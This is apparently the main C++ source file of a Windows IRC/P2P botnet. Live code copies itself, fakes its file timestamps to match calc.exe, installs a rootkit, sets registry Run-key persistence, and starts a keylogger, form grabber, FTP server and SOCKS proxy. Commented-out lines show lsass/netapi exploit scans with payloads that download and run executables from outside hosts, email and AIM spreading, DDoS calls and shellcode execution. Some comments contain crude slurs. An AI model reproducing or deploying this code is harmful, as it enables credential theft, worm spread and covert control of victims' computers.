#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include "Tlhelp32.h"
#include "config.h"
#ifdef _DEBUG
#include "debug.h"
#endif
#include "irc.h"
//#include "p2p.h"
#include "p2p2.h"
#include "registry.h"
#include "firewall.h"
#include "proxy.h"
#include "rand.h"
#include "file.h"
#include "rootkit.h"
#include "exception.h"
//#include "scan.h"
#include "payload_httpexec.h"
#include "http.h"
//#include "ddos.h"
#ifndef NO_FTP_SERVER
#include "ftp.h"
#endif
#ifdef FORMGRABBER_ON
#include "formgrabber.h"
#endif
#ifdef KEYLOG_ON
#ifdef KEYLOG_HOOK
#include "lgdll.h"
#else
#include "keylogger.h"
#endif
#endif
#include "sel.h"

HINSTANCE hInst;

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

/*class TestThread : public Thread
{
public:
	TestThread() { StartThread(); };
	VOID ThreadFunc(VOID){
		Socket Socket;
		Socket.Create(SOCK_STREAM);
		Socket.Connect("localhost", 100);
		for(UINT i = 0; i < 100; i++){
			Socket.Sendf("asdf");
			Sleep(50);
		}
		Socket.Disconnect(CLOSE_BOTH_HDL);
	};
};

class TestQueue : public ServeQueue
{
public:
	TestQueue() : ServeQueue(1024) {};
	VOID OnAdd(VOID) { dprintf("Size: %d\r\n", GetSize()); };
	VOID OnRead(VOID) { dprintf("r");  if(rand_r(0, 100) == 0) new TestThread();};
	VOID OnClose(VOID) { dprintf(" close "); };
	VOID OnRemove(VOID) { dprintf(" remove "); };
} TestQueue;*/

INT APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow){
#ifdef _DEBUG
	init_debug(80,200);
	dprintf("DEBUG\n\n");
#else
	SetUnhandledExceptionFilter(UnhandledExceptionFilterFunction);
#endif



	if(strncmp(lpCmdLine, "-c ", 3) == 0){
		PCHAR OutputFile = strchr(lpCmdLine, ' ') + 1;
		ChildImage ChildImage;
		ChildImage.Create(FALSE);
		DeleteFile(OutputFile);
		::File Output(OutputFile);
		DWORD BytesWritten = 0;
		Output.Write(ChildImage.GetBuffer(), ChildImage.GetSize(), &BytesWritten);
		Output.Close();
		return 0;
	}else
	if(strncmp(lpCmdLine, "-k ", 3) == 0){
		PCHAR KillFile = strchr(lpCmdLine, ' ') + 1;
		HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if(SnapShot != INVALID_HANDLE_VALUE){
			PROCESSENTRY32 ProcessEntry;
			ProcessEntry.dwSize = sizeof(ProcessEntry);
			if(Process32First(SnapShot, &ProcessEntry)){
				do{
					if(stricmp(ProcessEntry.szExeFile, KillFile) == 0 && ProcessEntry.th32ProcessID != GetCurrentProcessId()){
						HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEntry.th32ProcessID);
						if(Process != INVALID_HANDLE_VALUE){
							TerminateProcess(Process, NULL);
							WaitForSingleObject(Process, 60000);
							CloseHandle(Process);
							DeleteFile(ProcessEntry.szExeFile);
						}
					}
				}while(Process32Next(SnapShot, &ProcessEntry));
			}
			CloseHandle(SnapShot);
		}
	}else
	if(strncmp(lpCmdLine, "-s ", 3) == 0){
		Sleep(atoi(strchr(lpCmdLine, ' ') + 1));
	}

	MSG msg;
	HWND hWnd;

	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= NULL;
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= NULL;
	wcex.hCursor		= NULL;
	wcex.hbrBackground	= NULL;
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= "main";
	wcex.hIconSm		= NULL;

	RegisterClassEx(&wcex);

	if(!(hWnd = CreateWindow("main", "null", NULL, 0, 0, 0, 0, NULL, NULL, hInstance, NULL)))
		return 0;

	hInst = hInstance;

	WSADATA wsaData;
	WSAStartup(MAKEWORD( 1, 1 ), &wsaData);

/*	typedef BOOL (__stdcall *EnumProcessesP)(DWORD*, DWORD, DWORD*);
	typedef BOOL (__stdcall *EnumProcessModulesP)(HANDLE, HMODULE*, DWORD, LPDWORD);
	typedef DWORD (__stdcall *GetModuleBaseNameP)(HANDLE, HMODULE, LPTSTR, DWORD);
	HMODULE Dll = LoadLibrary("Psapi.dll");
	EnumProcessesP EnumProcessesF = (EnumProcessesP)GetProcAddress(Dll, "EnumProcesses");
	EnumProcessModulesP EnumProcessModulesF = (EnumProcessModulesP)GetProcAddress(Dll, "EnumProcessModules");
	GetModuleBaseNameP GetModuleBaseNameF = (GetModuleBaseNameP)GetProcAddress(Dll, "GetModuleBaseNameA");
	DWORD process[256],bytes;
	EnumProcessesF(process,sizeof(process),&bytes);
	for(int ia=0;ia<(bytes/sizeof(DWORD));ia++){
	HANDLE hproc = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,process[ia]);
	char szProcessName[MAX_PATH];
	if (hproc)
	{
		HMODULE hMod[1024];
		DWORD cbNeeded;

		if (EnumProcessModulesF(hproc,hMod,sizeof(hMod),&cbNeeded)){
			for(int i=0;i<1024;i++){
			GetModuleBaseNameF(hproc,hMod[i],szProcessName,sizeof(szProcessName)/sizeof(char));
				GetModuleBaseNameF(hproc,hMod[0],szProcessName,sizeof(szProcessName)/sizeof(char));
				if(strstr(szProcessName,"out") || strstr(szProcessName,"sp8") || strstr(szProcessName,"sp7")){
					TerminateProcess(hproc,0);
				}
			}
		}
	}
	}
*/

Config::StartTime.Reset();

#ifndef _DEBUG
	Config::GlobalMutex = CreateMutex(NULL, NULL, GLOBAL_MUTEX_NAME);
	if(GetLastError() == ERROR_ALREADY_EXISTS){
		return 0;
	}

/*	// Terminate existing process
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if(SnapShot != INVALID_HANDLE_VALUE){
		PROCESSENTRY32 ProcessEntry;
		ProcessEntry.dwSize = sizeof(ProcessEntry);
		if(Process32First(SnapShot, &ProcessEntry)){
			do{
				if(stricmp(ProcessEntry.szExeFile, EXE_FILENAME) == 0 && ProcessEntry.th32ProcessID != GetCurrentProcessId()){
					HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEntry.th32ProcessID);
					if(Process != INVALID_HANDLE_VALUE){
						if(!TerminateProcess(Process, NULL))
							return 0;
						WaitForSingleObject(Process, 60000);
						CloseHandle(Process);
					}
				}
			}while(Process32Next(SnapShot, &ProcessEntry));
		}
		CloseHandle(SnapShot);
	}*/

	CHAR FileName[MAX_PATH];
	PCHAR OutFileName = Config::GetExecuteFilename();
	GetModuleFileName(NULL, FileName, sizeof(FileName));
	CopyFile(FileName, OutFileName, FALSE);

	PCHAR ExeName = strrchr(FileName, '\\') + 1;
	if(stricmp(ExeName, EXE_FILENAME) != 0){
		GetSystemDirectory(FileName, sizeof(FileName));
		strcat(FileName, "\\calc.exe");
		File File(FileName);
		FILETIME CTime, ATime, WTime;
		GetFileTime(File.GetHandle(), &CTime, &ATime, &WTime);
		File.Close();
		File.Open(OutFileName);
		SetFileTime(File.GetHandle(), &CTime, &ATime, &WTime);
		File.Close();
		STARTUPINFO StartupInfo;
		PROCESS_INFORMATION ProcessInfo;
		memset(&StartupInfo, NULL, sizeof(StartupInfo));
		StartupInfo.cb = sizeof(StartupInfo);
		CreateProcess(OutFileName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &StartupInfo, &ProcessInfo);
		CloseHandle(ProcessInfo.hProcess);
		CloseHandle(ProcessInfo.hThread);
		return 0;
	}


	new RootKit;


/*	// remove old version links
	UINT i = 0;
	for(UINT j = 0; j < 255; j++){
		LinkCache::Link Link = LinkCache::GetNextLink(&i);
		if(Link.Port == 8 || Link.Port == 0){
			LinkCache::RemoveLink(Link.Hostname);
			CHAR Encoded[256];
			LinkCache::EncodeName(Encoded, sizeof(Encoded), Link.Hostname, Link.Port);
			LinkCache::RemoveLink(Encoded);
			if(i > 0)
				i--;
		}
	}
	//
	*/

	cRegistry Reg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	if(strcmp(Reg.GetString(REG_STARTUPNAME), OutFileName) != 0){
		if(Reg.SetString(REG_STARTUPNAME, OutFileName) != ERROR_SUCCESS){
			Reg.CloseKey();
			Reg.OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			Reg.SetString(REG_STARTUPNAME, OutFileName);
			Reg.CloseKey();
		}
	}

	if(LinkCache::GetLinkCount() < 10){
		LoadEmbeddedLinks();
	}

	new P2P2;
#else
//new P2P2;
//HTTP::Post("http://www.oreillynet.com/mt/mt-comments.cgi", "static=1&entry_id=18294&author=john&url=aol&text=test2&post=Post");
//SEL::Script* Script = new SEL::Script("");
//Script->Run();
//new P2P2;
//HTTP::HostChildImage* Test = new HTTP::HostChildImage;

//new HTTP::HostChildImage("pee.exe");
	//new P2P2;
/*PayloadHTTPExec* Payload = new PayloadHTTPExec("http://192.168.2.137/test/calc.exe");
PCHAR Buffer = Payload->GetShellcode();
for(UINT i = 0; i < sizeof(scode) - 1; i++){
	//if(!(i % 16))
		//dprintf("\".\r\n\"");
	dprintf("%%%.2X", (BYTE)scode[i]);
}*/
/*Exploits.SetExploit("netapi");
Exploits.SetPayload(new PayloadHTTPExec("http://192.168.2.137/test/calc.exe"));
ScanThread* Scan = new ScanThread(0);
Scan->AddTarget("192.168.2.57");
Scan->Resume();*/
#endif

//IRCList.Add(new IRC("irc.prison.net", 6667, "#pee3", "stevbot1", "ident2", "defaultname", "*"));

	//LinkCache::AddLink("localhost:12345");
	//new P2P2;
	//ExecuteMessage("5,1|127.0.0.1|6112|1|5|300|30");
	//IRCList.Add(new IRC("irc.deviantart.net", 6667, "#penishole", "negroid##", ">>>>>", Config::GetUUIDAscii(), "dick*!*none@*"));
	//for(UINT i = 0; i < 10; i++){
	//	MSM::SendIM("Kyle", "poop", FALSE);
	//	Sleep(500);

	//}
	/*ExecuteMessage("13,target,add,192.168.1.119");
	ExecuteMessage("13,exploit,lsass");
	ExecuteMessage("13,payload,httpexec,http://192.168.1.107/out.exe");
	ExecuteMessage("13,start,1000");*/

	//PayloadHTTPExec* Payload = new PayloadHTTPExec("http://192.168.1.107/calc.exe");

	/*void (*func)();
	*(int*)&func = (int)Payload->GetShellcode();
	func();*/

	//Exploits.SetPayload(Payload);
	//Exploits.Run("192.168.1.119", 445);

	//new EmailSpread(1);
	//new AimSpread(10);

	//DDoS* poop = new DDoS();
	//poop->AddVictim("localhost", 80, DDOS_ICMP, 4, 500, 60);

	//new ScanThread("24.117.*.*", "445");

	//new SocksServer(1080, SOCKS_VER_5);

	//new ProxyServer(ALLOW_SOCKS_VER_4 | ALLOW_SOCKS_VER_5, 51015);
	/*UCHAR User[] = "x";
	UCHAR Pass[] = "y";
	CHAR uHash[16], pHash[16];
	MD5 MD5;
	MD5.Update(User, 1);
	MD5.Finalize((PUCHAR)uHash);
	::MD5 MD52;
	MD52.Update(Pass, 1);
	MD52.Finalize((PUCHAR)pHash);
	Config::EnableSocksStartup(ALLOW_SOCKS_VER_5, 51015, uHash, pHash);*/

/*	Socket Socket;
	Socket.Create(SOCK_DGRAM);
	sockaddr_in Temp;
	Socket.FillAddrStruct(&Temp, "127.0.0.1", 7);
	Socket.SendTo("test", 4, (sockaddr *)&Temp, sizeof(Temp));*/

/*	class Con : public Socks
	{
	public:
		Con() {};
		VOID OnFail(UINT ErrorCode) { dprintf("OnFail()\r\n"); };
		VOID OnReady(VOID) { dprintf("Sending data\r\n"); Socket.Sendf("GET / HTTP\1.1\r\n\r\n"); };
		VOID ProcessSpecial(WSANETWORKEVENTS NetEvents){
			if(NetEvents.lNetworkEvents & FD_READ){
				while(RecvBuf.Read(Socket) > 0){
					INT Length = RecvBuf.GetBytesRead();
					RecvBuf.PopBuffer();
					RecvBuf.PoppedItem[Length] = NULL;
					dprintf("%s", RecvBuf.PoppedItem);
				}
			}
		};
	};

	Con Con;
	Con.Connect("localhost", 1080, "nintendo.com", 80, "masterwill", "poop", SOCKS_VER_5);

	while(1){
		WSAEVENT hEvent = Con.GetSocketP()->GetEventHandle();
		WSANETWORKEVENTS NetEvents;
		if(WSAWaitForMultipleEvents(1, &hEvent, FALSE, 1000, FALSE) != WSA_WAIT_TIMEOUT){
			Con.GetSocketP()->EnumEvents(&NetEvents);
			Con.Process(NetEvents);
		}
	}*/
	/*Socket Listen;
	Listen.Create(SOCK_STREAM);
	Listen.EventSelect(FD_ACCEPT);
	Listen.Bind(100);
	Listen.Listen(64);
	WSAEVENT hEvent = Listen.GetEventHandle();
	WSANETWORKEVENTS NetEvents;
	while(1){
		if(WSAWaitForMultipleEvents(1, &hEvent, FALSE, 1000, FALSE) != WSA_WAIT_TIMEOUT){
			Listen.EnumEvents(&NetEvents);
			if(NetEvents.lNetworkEvents & FD_ACCEPT){
				Socket Socket;
				Listen.Accept(Socket);
				Socket.EventSelect(FD_READ | FD_CLOSE);
				TestQueue.Add(Socket);
				dprintf(" accept ");
			}
		}else{
			for(UINT i = 0; i < 1; i++)
				new TestThread();
		}
	}*/

//

	/*PBYTE Image;
	DWORD FileSize = CreateChildImage(&Image, TRUE);
	DeleteFile("out.exe");
	::File Output("out.exe");
	DWORD BytesWritten = 0;
	Output.Write(Image, FileSize, &BytesWritten);
	Output.Close();
	delete[] Image;*/
				
	/*PBYTE Image;
	DWORD Size = Compress(&Image);
	File O("output.bin");
	O.Write(Image, Size);
	O.Close();
	delete[] Image;

	Decompress();*/
	

	/*BYTE FTPUserHash[16], FTPPassHash[16];
	MD5 MD5User;
	MD5User.Update((PUCHAR)"jim", strlen("jim"));
	MD5User.Finalize(FTPUserHash);
	MD5 MD5Pass;
	MD5Pass.Update((PUCHAR)"poop", strlen("poop"));
	MD5Pass.Finalize(FTPPassHash);

	Config::EnableFTPStartup(21, FTPUserHash, FTPPassHash);*/

#ifdef FORMGRABBER_ON
	new FormGrabberThread;
#endif

#ifdef KEYLOG_ON
#ifdef KEYLOG_HOOK
	HMODULE hDLL = LoadLibrary("lgdll.dll");
	if(hDLL)
		InstallHook();
#else
	new KeyLogThread;
#endif
#endif

#ifndef NO_FTP_SERVER
	if(Config::LoadFTPStartupData())
		new FTPServer(Config::FTPPort, Config::FTPUserHash, Config::FTPPassHash);
#endif
	if(Config::LoadSocksStartupData())
		new ProxyServer(Config::SocksVersion, Config::SocksPort, Config::SocksUserHash, Config::SocksPassHash);

	while(GetMessage(&msg, NULL, 0, 0) > 0){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam){
	switch(msg) 
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	case WM_QUERYENDSESSION:
		if(lParam & ENDSESSION_LOGOFF)
			IRCList.QuitAll(IRC_QUIT_MESSAGE_LOGOFF);
		else
			IRCList.QuitAll(IRC_QUIT_MESSAGE_SHUTDOWN);
		return DefWindowProc(hWnd, msg, wParam, lParam);
		break;
	default:
		return DefWindowProc(hWnd, msg, wParam, lParam);
	}
	return 0;
}
